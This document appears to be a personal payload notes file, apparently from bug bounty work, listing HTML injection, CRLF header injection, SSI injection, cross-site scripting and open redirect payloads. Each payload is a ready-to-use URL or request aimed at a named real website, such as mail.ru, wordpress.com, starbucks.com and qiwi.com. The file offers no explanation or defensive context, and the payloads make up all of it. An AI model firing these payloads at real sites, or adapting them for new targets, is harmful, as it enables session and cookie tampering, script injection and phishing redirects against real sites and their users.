# stuff-h1
Bob rov

html injection 

1:<a href="//bf.am">Welcome</a>  in name field


crlf injection

1:https://touch.lady.mail.ru/%0aSet-Cookie:csrftoken=x;domain=.mail.ru;

2:http://www.vimeopro.com/crlftest%0dSet-Cookie:test=test;domain=.vimeopro.com

3:http://ishop.qiwi.com/test%0dSet-Cookie:test2=test;domain=.qiwi.com

SSI injection

1:GET //#"--><!--#include file="robots.txt"-->


xss

1:https://blackfan.ru/x?r=https://realty.mail.ru/%22--%3e%3csvg/onload=alert(document.domain)%3e/%252e%252e

2:https://apps.wordpress.com/support/&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;

3:http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e   (chrome)

4:http://newscdn.starbucks.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e  (firefox)


Open Redirect

1: https://dashboard.signwithenvoy.com//www.google.com/%2e%2e%2f

2: https://admin.c2fo.com///www.google.com/%2e%2e

3: http://zaption.com///www.google.com/%2f%2e%2e

4:http://greenhouse.io/%0d%0aSet-Cookie:test=test;domain=.greenhouse.io
----------------------------------------------
